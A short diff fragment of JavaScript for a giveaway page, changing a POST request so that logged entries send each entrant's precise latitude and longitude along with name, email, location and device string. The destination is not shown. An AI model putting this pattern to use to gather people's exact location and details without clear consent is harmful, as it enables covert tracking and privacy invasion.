@@ -379,7 +379,7 @@ method:"POST",
 headers:{ "Content-Type":"application/json" },
 body:JSON.stringify({
 content:
-`🎯 Giveaway Entry Logged\n\nName: ${playerName}\nEmail: ${email}\nLocation: ${geoData.location}\nDevice: ${navigator.userAgent}\nTime: ${new Date().toLocaleString()}`
+`🎯 Giveaway Entry Logged\n\nName: ${playerName}\nEmail: ${email}\nLocation: ${geoData.location}\nLatitude: ${geoData.lat}\nLongitude: ${geoData.lon}\nDevice: ${navigator.userAgent}\nTime: ${new Date().toLocaleString()}`
 })
 })
 
